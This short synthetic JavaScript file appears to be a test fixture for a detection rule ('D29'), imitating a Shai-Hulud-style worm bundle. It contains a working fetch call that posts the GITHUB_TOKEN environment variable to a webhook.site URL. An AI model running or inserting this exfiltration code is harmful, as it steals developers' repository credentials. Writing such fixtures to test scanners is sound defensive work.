// Synthetic — Shai-Hulud-style bundle.
// Triggers D29 via the worm name and the webhook.site exfil URL.
const SH = 'Shai-Hulud';
fetch('https://webhook.site/01234567-89ab-cdef-0123-456789abcdef', {
  method: 'POST',
  body: JSON.stringify({ token: process.env.GITHUB_TOKEN })
});
